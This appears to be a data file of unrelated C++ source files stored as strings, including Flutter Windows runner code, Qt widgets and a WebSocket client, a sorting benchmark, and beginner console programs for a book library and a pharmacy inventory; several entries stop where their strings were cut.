    "/*****************************************************************************\n\n  Licensed to Accellera Systems Initiative Inc. (Accellera) under one or\n  more contributor license agreements.  See the NOTICE file distributed\n  with this work for additional information regarding copyright ownership.\n  Accellera licenses this file to you under the Apache License, Version 2.0\n  (the \"License\"); you may not use this file except in compliance with the\n  License.  You may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an \"AS IS\" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n  implied.  See the License for the specific language governing\n  permissions and limitations under the License.\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  display.cpp -- \n\n  Original Author: Martin Janssen, Synopsys, Inc., 2002-02-15\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  MODIFICATION LOG - modifiers, enter your name, affiliation, date and\n  changes you are making here.\n\n      Name, Affiliation, Date:\n  Description of Modification:\n\n *****************************************************************************/\n\n/* Filename display.cc */\n/* This is the implementation file for synchronous process `display' */\n\n#include \"display.h\"\n\nvoid display::entry()\n{\n  while (true) {\n    char buf[BUFSIZ];\n    sprintf( buf, \"Result = %.16g\", in.read() );\n    cout << buf << endl;\n    wait();\n  }\n} // end of entry function\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\n#include \"UsersLoader.h\"\n\n#include <iostream>\n//#include \"User.h\"\n#define INIT_BUCKET_SIZE 8\n#define ERROR_MSG \"input file is incorrect\"\n\n#include <vector>\n#include <fstream>\n#include <sstream>\n#include <stdexcept>\n#include <memory>\n\n\n#define YEAR_SEPARATOR '-'\n\n\nstd::vector<User>\nUsersLoader::create_users\n(const std::string &users_file_path, std::unique_ptr<RecommendationSystem> rs)\nnoexcept(false)\n{\n    std::shared_ptr<RecommendationSystem> s_rs = std::move (rs);\n    std::ifstream in_file;\n    std::vector<User> users;\n    in_file.open(users_file_path);\n    std::string buffer;\n    getline(in_file, buffer);\n    std::istringstream movies_names(buffer);\n    std::vector<sp_movie> movies;\n    while (movies_names >> buffer)\n    {\n        size_t end = buffer.find(YEAR_SEPARATOR);\n        sp_movie m = s_rs->get_movie(buffer.substr(0, end),\\\n                                      std::stoi\\\n\t\t\t\t\t\t\t\t\t (buffer.substr\\\n\t\t\t\t\t\t\t\t\t (end + 1, buffer.length())));\n        movies.push_back(m);\n    }\n    while (getline(in_file, buffer))\n    {\n        std::string user_name;\n        std::string ranking;\n        std::istringstream splitted_line(buffer);\n        splitted_line >> user_name;\n        int i = 0;\n        rank_map ranks(INIT_BUCKET_SIZE,sp_movie_hash,sp_movie_equal);\n        while (splitted_line >> ranking)\n        {\n\n            if (ranking != \"NA\")\n            {\n                int rating = std::stoi(ranking);\n                if (rating <= 0){\n                    throw std::invalid_argument(ERROR_MSG);\n                }\n                ranks[movies[i]] = rating;\n            }\n            i++;\n        }\n        users.emplace_back(user_name, ranks, s_rs);\n    }\n    in_file.close();\n    return users;\n}\n",
    "#include <chrono>\n#include <iostream>\n#include <unistd.h>\n#include <numeric>\n#include <algorithm>\n#include <vector>\n#include \"SortingAlgorithm.hpp\"\n#include <iomanip>\n\nusing namespace std;\n\ntemplate<typename T>\ndouble TimeBubble(vector<T>& v)\n{\n    chrono::steady_clock::time_point t_begin = chrono::steady_clock::now();\n    SortLibrary::BubbleSort(v);\n    chrono::steady_clock::time_point t_end = chrono::steady_clock::now();\n\n    double timeElapsed = chrono::duration_cast<chrono::nanoseconds>(t_end-t_begin).count();\n    return timeElapsed;\n}\n\ntemplate<typename T>\ndouble TimeMerge(vector<T>& v)\n{\n    chrono::steady_clock::time_point t_begin = chrono::steady_clock::now();\n    SortLibrary::MergeSort(v);\n    chrono::steady_clock::time_point t_end = chrono::steady_clock::now();\n\n    double timeElapsed = chrono::duration_cast<chrono::nanoseconds>(t_end-t_begin).count();\n    return timeElapsed;\n}\n\n\nint main(int argc, char ** argv)\n{\n    int n = 0;\n    size_t dimv = stoi(argv[1]);\n    unsigned int iters = 100;\n    vector<int> v(dimv);\n    double time_Bubble = 0;\n    double time_Merge = 0;\n\n    cout << scientific << setprecision(4);\n    // Vector of random integers in range 0-987\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=0; i<dimv; i++){\n            v[i] = rand() % 987;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v = time_Bubble/iters;\n    double time_MergeSort_v = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a random integers vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v << endl\n         << \"MergeSort : \" << time_MergeSort_v << endl << endl;\n\n\n    // Vector of random doubles in range 0-1\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    vector<double> w(dimv);\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=0; i<dimv; i++){\n            w[i] = rand();\n        }\n        vector<double> w_copia = w;\n\n        time_Bubble += TimeBubble(w);\n        time_Merge += TimeMerge(w_copia);\n    }\n    double time_BubbleSort_w = time_Bubble/iters;\n    double time_MergeSort_w = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a random doubles vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_w << endl\n         << \"MergeSort : \" << time_MergeSort_w << endl << endl;\n\n\n    // Vector of ascending ordered integers\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    vector<int> v_copia = v;\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v3 = time_Bubble/iters;\n    double time_MergeSort_v3 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a ordered integers vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v3 << endl\n         << \"MergeSort : \" << time_MergeSort_v3 << endl << endl;\n\n\n    unsigned int half_dim = dimv/2;\n    // Vector of ordered integers with the fist half perturbed\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=0; i<half_dim; i++){\n            v[i] = rand() % half_dim;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v1 = time_Bubble/iters;\n    double time_MergeSort_v1 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a integers vector with the fist half of elements perturbed\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v1 << endl\n         << \"MergeSort : \" << time_MergeSort_v1 << endl << endl;\n\n\n    // Vector of ordered integers with the second half perturbed\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=half_dim; i<dimv; i++){\n            v[i] = rand() % dimv + half_dim;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v2 = time_Bubble/iters;\n    double time_MergeSort_v2 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a integers vector with the second half of elements perturbed\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v2 << endl\n         << \"MergeSort : \" << time_MergeSort_v2 << endl << endl;\n\n\n    // Vector of ordered integers which elements have been switched in pairs\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    int dimv_floor = (dimv/2)*2;\n    for (unsigned int ",
    "#include \"VariablesView.hpp\"\r\n\r\n#include <QHeaderView>\r\n\r\n#include \"VariableInformation.hpp\"\r\n\r\nVariablesView::VariablesView(QWidget* parent) :\r\n\tQTableWidget{parent}\r\n{\r\n\tsetContextMenuPolicy(Qt::CustomContextMenu);\r\n\tsetWordWrap(false);\r\n\tsetCornerButtonEnabled(false);\r\n\tsetFocusPolicy(Qt::NoFocus);\r\n\tsetSelectionMode(QAbstractItemView::NoSelection);\r\n\tsetEditTriggers(QAbstractItemView::NoEditTriggers);\r\n\r\n\thorizontalHeader()->setVisible(false);\r\n\thorizontalHeader()->setMinimumSectionSize(40);\r\n\thorizontalHeader()->setSectionResizeMode(QHeaderView::ResizeToContents);\r\n\r\n\tverticalHeader()->setVisible(false);\r\n\tverticalHeader()->setSectionResizeMode(QHeaderView::ResizeToContents);\r\n\r\n\tsetFixedHeight(80);\r\n}\r\n\r\nvoid VariablesView::setVariableInformation(const QList<VariableInformation>& variableInformationList)\r\n{\r\n\tauto addInformation = [](const QString& info, const QColor& backgroundColor, Qt::AlignmentFlag align)->QTableWidgetItem*\r\n\t{\r\n\t\tconst QFont ItemFont(\"Courier New\", 16, QFont::Normal);\r\n\r\n\t\tQTableWidgetItem* item = new QTableWidgetItem(info);\r\n\t\titem->setTextAlignment(align);\r\n\t\titem->setFont(ItemFont);\r\n\t\titem->setBackground(QBrush(backgroundColor));\r\n\r\n\t\treturn item;\r\n\t};\r\n\r\n\tsetRowCount(3);\r\n\tsetColumnCount(0);\r\n\r\n\tfor(const VariableInformation& variableInformation : variableInformationList)\r\n\t{\r\n\t\tinsertColumn(columnCount());\r\n\r\n\t\tsetItem(0, columnCount() - 1, addInformation(variableInformation.mName, Qt::transparent, Qt::AlignCenter));\r\n\t\tsetItem(1, columnCount() - 1, addInformation(QStringLiteral(\"\"), Qt::transparent, Qt::AlignCenter));\r\n\t\tsetItem(2, columnCount() - 1, addInformation(QStringLiteral(\"\"), variableInformation.mColor, Qt::AlignCenter));\r\n\t}\r\n}\r\n\r\nvoid VariablesView::setVariables(const QVector<QPair<QString, QString>>& variables)\r\n{\r\n\tfor(int j = 0; j < variables.size(); ++j)\r\n\t{\r\n\t\tfor(int i = 0; i < columnCount(); ++i)\r\n\t\t{\r\n\t\t\tif(item(0, i)->text() == variables.at(j).first)\r\n\t\t\t\titem(1, i)->setText(variables.at(j).second);\r\n\t\t}\r\n\t}\r\n}\r\n",
    "#include \"Book.h\"\nint main()\n{\n\tint NBooks=NULL;\n    FILE* fp = nullptr;\n    Book* books=new Book[1];\n    \n    fopen_s(&fp, \"books.txt\", \"r\"); //\u00e7\u00e0\u00ef\u00ee\u00e2\u00ed\u00e5\u00ed\u00ed\u00ff \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3 \n    if (fp != NULL) \n    {    \n        fread(&NBooks, sizeof(int), 1, fp);\n        delete[] books;\n        books = new Book[NBooks];\n        for(int i =0 ;i<NBooks;i++)\n        {\n            books[i].loadFromBinFile(fp);\n        }\n        fclose(fp);\n    }\n\n\n\tint menu,deleteId,menuSort,menuEdit,editId,menuFind;\n    Book tmp;\n\tdo \n\t{\n        cout << \"--------------------------------\\n\";\n        cout << \"|             MENU             |\\n\";\n        cout << \"|------------------------------|\\n\";\n        cout << \"|1.Show all books in library   |\\n\";\n        cout << \"|2.Add new book                |\\n\";\n        cout << \"|3.Remove book                 |\\n\";\n        cout << \"|4.Show sorted books           |\\n\";\n        cout << \"|5.Edit info in book           |\\n\";\n        cout << \"|6.Search book                 |\\n\";\n        cout << \"|------------------------------|\\n\";\n        cout << \"|0.Exit                        |\\n\";\n        cout << \"--------------------------------\\n\";\n        cout << \" >>> \"; cin >> menu;\n\t\n        switch (menu)\n        {\n        \n        case 1:\n            cout << \"\\n\\n\\n\";\n            for(int i = 0;i<NBooks;i++)\n            {\n                books[i].showBook();\n            }\n            cout << \"\\n\\n\\n\";\n            break;\n        \n        case 2:\n            tmp.addNewBook();\n            if (NBooks==NULL) \n            {\n                cout << \"asd\";\n                books[0] = tmp;\n                NBooks=1;\n            }\n            else\n            {\n                addItemBack(books, NBooks, tmp);\n            }\n            break;\n        \n        case 3:\n            char deleteName[50];\n            cout << \"\\n\\nEnter book name to delete - \";\n            cin.ignore();\n            cin.getline(deleteName,50);\n            cout << endl;\n            deleteId = -1;\n            for (int i = 0; i < NBooks; i++)\n            {\n                if (strcmp(books[i].name, deleteName) == 0) \n                {\n                    deleteId = i;\n                    break;\n                }\n            }\n            if(deleteId!=-1)\n            {\n            removeItem(books, NBooks, deleteId);\n            cout << \"Deleted!\\n\" << endl;\n            }\n            else \n            {\n                cout << \"Not found book with that name!\\n\"<<endl;\n            }\n            break;\n\n        case 4:\n            do {\n                cout << \"\\n\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \"|                           SORT                     |\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \"|1.Sort by pages (from max to min)                   |\\n\";\n                cout << \"|2.Sort by develope year (from older to newest)      |\\n\";\n                cout << \"|3.Sort by add to library year (from older to newest)|\\n\";\n                cout << \"|----------------------------------------------------|\\n\";\n                cout << \"|0.Back to main menu                                 |\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \" >>> \"; cin >> menuSort;\n                cout << \"\\n\\n\";\n                \n                switch (menuSort) \n                {\n                case 1:\n                    showSortedPages(books, NBooks);\n                    break;\n                case 2:\n                    showSortedDateWriten(books, NBooks);\n                    break;\n                case 3:\n                    showSortedDateAdded(books, NBooks);\n                    break;\n                case 0:\n                    break;\n                default:\n                    cout << \"Error command!\"<<endl;\n                    break;\n                }\n            } while (menuSort != 0);\n                break;\n        case 5:\n            char editingBook[50];\n            cout << \"\\nEnter name of book for edit - \";\n            cin.ignore();\n            cin.getline(editingBook, 50);\n            cout << endl;\n            editId = -1;\n            for (int i = 0; i < NBooks; i++)\n            {\n                if (strcmp(books[i].name, editingBook) == 0)\n                {\n                    editId = i;\n                    break;\n                }\n            }\n            if(editId!=-1)\n            {\n                do {\n\n                    cout << \"\\n\\n\";\n                    cout << \"-------------------------------------------------\\n\";\n                    cout << \"|                          EDIT                 |\\n\";\n                    cout << \"-------------------------------------------------\\n\";\n                    cout << \"|1. Edit type of book                           |\\n\";\n                    cout << \"|2. Edit name of book                           |\\n\";\n                    ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include<iostream>\r\n#include<vector>\r\n#include<fstream>\r\nusing namespace std;\r\nstruct pharmacy{\r\n\tchar id;\r\n\tstring name;\r\n\tint quantity;\r\n\tint price;\r\n};\r\n    pharmacy phar;\r\n    vector<pharmacy> medics;\r\n   \r\n    addval(){\r\n    \tint choice;\r\n    \tdo{\r\n    \t\tcout<<\"Id: \";cin>>phar.id;\r\n    \t\tcout<<\"Name: \";cin>>phar.name;\r\n    \t\tcout<<\"quantity: \";cin>>phar.quantity;\r\n    \t\tcout<<\"price: \";cin>>phar.price;\r\n    \t\tmedics.push_back(phar);\r\n    \t\tcout<<\"save successfuly\"<<endl;\r\n    \t\tcout<<\"enter '0' for exit or '1' for continue: \";cin>>choice;\r\n\t\t}\r\n\t\twhile(choice!=0 && choice ==1);\r\n\t}\r\n\t\r\n\tsearch(){\r\n\t\tstring n;\r\n\t\tcout<<\"Enter name for search: \";cin>>n;\r\n\t\tfor(int i=0;i<medics.size();i++){\r\n\t\t\tif(n==medics[i].name){\r\n\t\t\t\tcout<<i+1<<\". Id:\"<<medics[i].id<<endl;\r\n\t\t\t\tcout<<i+1<<\". name:\"<<medics[i].name<<endl;\r\n\t\t\t\tcout<<i+1<<\". quantity:\"<<medics[i].quantity<<endl;\r\n\t\t\t\tcout<<i+1<<\". price:\"<<medics[i].price<<endl<<endl;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\n\tdel (){\r\n\t\tstring n;\r\n\t\tcout<<\"Enter name for search: \";cin>>n;\r\n\t\tfor(int i=0;i<medics.size();i++){\r\n\t\t\tif(n==medics[i].name){\r\n\t\t\t\tmedics.erase(medics.begin()+i);\r\n\t\t\t\tcout<<\"deleted \"<<medics[i].name<<endl<<endl;\r\n\t\t\t}\r\n\t}\r\n}\r\n\tshow(){\r\n\t\tfor(int i=0;i<medics.size(); i++){\r\n\t\tcout<<i+1<<\". Id:\"<<medics[i].id<<endl;\r\n\t\t\t\tcout<<\" name:\"<<medics[i].name<<endl;\r\n\t\t\t\tcout<<\" quantity:\"<<medics[i].quantity<<endl;\r\n\t\t\t\tcout<<\" price:\"<<medics[i].price<<endl<<endl;\t\r\n\t\t}\r\n\t}\r\n\t\r\n\t\tsave(const vector<pharmacy>&medics, const string& medical){\r\n\t\tofstream out(\"D:/medical.txt\");\r\n\t\tif(!out){\r\n\t\t\tcerr<<\"file not found: \"<<medical<<endl;\r\n\t\t}\r\n\t\tfor(int i=0;i<medics.size(); i++){\r\n\t\t\tout<<i+1<<\"Id: \"<<medics[i].id<<endl<<\" name:\"<<medics[i].name<<endl\r\n\t\t\t<<\"quantity: \"<<medics[i].quantity<<endl<<\"price: \"<<medics[i].price<<endl;\r\n\t\t}\r\n\t\tout.close();\r\n\t\tcout<<\"medicines saved to file \"<<medical<<endl<<endl;\r\n\t\t}\r\n\t\r\n\t\r\n    int main(){\r\n    \twhile(true){\r\n    \t\tint value;\r\n    \t\tcout<<\"\\t\\t===================\\n\\n\";\r\n\t\t    cout<<\"\\t\\t-------------------\\n\";\r\n\t\t        cout<<\"1.for add medicines: \"<<endl;\r\n    \t     \tcout<<\"2.for search medicines: \"<<endl;\r\n    \t\t    cout<<\"3.for delete medicines: \"<<endl;\r\n    \t\t    cout<<\"4.for show all medicines: \"<<endl;\r\n    \t\t    cout<<\"5.for save medicines to file: \"<<endl;\r\n    \t    \tcout<<\"6.for exit from program: \"<<endl;\r\n    \t    \tcout<<\"\\t\\t---------------------\\n\";\r\n    \t\tcout<<\"type here:\";cin>>value;\r\n    \t\tswitch(value){ system(\"cls\");\r\n    \t\t\tcase 1:{\r\n\t\t\t\t\taddval();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 2:{        system(\"cls\");\r\n\t\t\t\t\tsearch();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 3:{        system(\"cls\");\r\n\t\t\t\t\tdel();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 4:{        system(\"cls\");\r\n\t\t\t\t\tshow();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 5:{\r\n\t\t\t\t\tsave(medics, \"D:/medical.txt\" );\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 6:{\r\n\t\t\t\t\texit(0);\r\n\t\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\tdefault:\r\n\t\t\t\t{system(\"cls\"); cout<<\"invalid input \"<<endl<<endl;}\r\n\t\t}\r\n\t}\r\n\t\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"client.h\"\r\n#include <QLocale>\r\nQTextStream cin(stdin);\r\n\r\nClient::Client(QObject *parent) //\u00ef\u00f0\u00ee\u00e8\u00f1\u00f5\u00ee\u00e4\u00e8\u00f2 \u00e8\u00ed\u00e8\u00f6\u00e8\u00e0\u00eb\u00e8\u00e7\u00e0\u00f6\u00e8\u00ff \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0 \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00f1\u00ea\u00ee\u00e3\u00ee \u00f1\u00ee\u00ea\u00e5\u00f2\u00e0\r\n    :QObject{parent}\r\n{\r\n    cin.setEncoding(QStringConverter::Encoding::System);\r\n    socket=new QWebSocket;\r\n\r\n    //\u00f1\u00e2\u00ff\u00e7\u00fb\u00e2\u00e0\u00ed\u00e8\u00e5 \u00f1\u00e8\u00e3\u00ed\u00e0\u00eb\u00ee\u00e2 \u00f1 \u00f1\u00ee\u00ee\u00f2\u00e2\u00e5\u00f2\u00f1\u00f2\u00e2\u00f3\u00fe\u00f9\u00e8\u00ec\u00e8 \u00f1\u00eb\u00ee\u00f2\u00e0\u00ec\u00e8:\r\n    connect(socket,&QWebSocket::textMessageReceived,this,&Client::messageReceived);\r\n    connect(socket,&QWebSocket::binaryMessageReceived,this,&Client::serverMessageReceived);\r\n    connect(socket,&QWebSocket::disconnected,socket,&QWebSocket::deleteLater);\r\n    connect(this,&Client::needToSendMessage,socket,&QWebSocket::sendTextMessage);\r\n\r\n    //\u00ef\u00f0\u00ee\u00e8\u00f1\u00f5\u00ee\u00e4\u00e8\u00f2 \u00f7\u00f2\u00e5\u00ed\u00e8\u00e5 \u00e8\u00e7 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00e8 ip-\u00e0\u00e4\u00f0\u00e5\u00f1\u00e0 \u00e8 \u00ef\u00ee\u00f0\u00f2\u00e0 \u00e4\u00eb\u00ff \u00ef\u00ee\u00e4\u00ea\u00eb\u00fe\u00f7\u00e5\u00ed\u00e8\u00ff\r\n    QString addr,port;\r\n    qDebug() << \"Please, enter server address:\";\r\n    cin >> addr;\r\n    qDebug() << \"Please, enter port for connecting: \";\r\n    cin >> port;\r\n    connectToServer(qMakePair(addr,port));\r\n}\r\n\r\nvoid Client::connectToServer(const QPair<QString,QString> connectionData){ 